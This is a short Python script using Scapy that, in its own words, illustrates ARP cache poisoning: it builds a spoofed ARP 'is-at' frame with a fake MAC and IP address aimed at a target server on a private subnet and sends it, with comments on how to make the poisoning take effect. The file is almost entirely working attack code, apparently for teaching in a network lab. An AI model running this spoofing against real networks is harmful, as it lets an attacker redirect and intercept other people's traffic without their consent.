# This script illustrates the ARP cache poisoning attack.
#
# notes:
#
#       Get an entry in the ARP cache for a remote host, identified by its IP: ping <IP address>
#       Get IP addresses and hardware addresses: arp -na
#       Delete an entry in the ARP table: arp -d <IP address>

from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP
from scapy.all import *

# Goal:
#   You have the IP address '10.0.4.34' and the MAC address 'ec:b1:d7:31:23:25'.
#   You want to poison the ARP cache of a remote server.
#   => you want to make it believe that your hardware address is '00:01:02:03:04:31' (instead of 'ec:b1:d7:31:23:25').

MY_IP = '10.0.4.34'  # My IP address
MY_HW = 'ec:b1:d7:31:23:25'  # My hardware address
MY_FAKE_IP = '10.0.4.139'  # My fake IP address
MY_FAKE_HW = '00:01:02:03:04:31'  # My fake hardware address
DST_IP = '10.0.4.25'  # The IP address of the server you want to poison the ARP cache.
DST_HW = 'ec:b1:d7:31:24:b5'  # The hardware of the server you want to poison the ARP cache.

print(conf.iface)

trame = Ether(
    dst=DST_HW,
    # Note: you don't have to modify the following MAC address (src=...).
    #       However, if you do, then it will trigger a broadcast.
    src=MY_FAKE_HW) /\
        ARP(
            # NOTE:
            #  - If you specify op='is-at' (RESPONSE), then you may need to send the response multiple times.
            #  - if you specify op='who-has' (REQUEST), then a single request does the job.
            #    In this case, do not specify the destination hardware address (hwdst) (by default: 0 zeros).
            op='is-at',
            hwsrc=MY_FAKE_HW,
            psrc=MY_FAKE_IP,
            hwdst=DST_HW,  # In the case of a REQUEST, do not specify this parameter.
            pdst=DST_IP)

trame.show()
rep = srp1(trame, iface='eno1')
rep.show()
